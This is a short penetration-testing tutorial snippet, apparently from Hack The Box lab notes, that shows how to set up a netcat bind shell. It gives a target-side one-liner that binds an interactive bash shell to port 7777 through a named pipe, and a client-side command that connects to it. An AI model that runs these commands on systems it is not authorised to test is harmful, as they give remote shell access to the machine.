## Establishing a Basic Bind Shell with Netcat
#### No. 1: Server - Binding a Bash shell to the TCP session
```shell
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

#### No. 2: Client - Connecting to bind shell on target
```shell
V0xD0x@htb[/htb]$ nc -nv 10.129.41.200 7777

Target@server:~$  
```
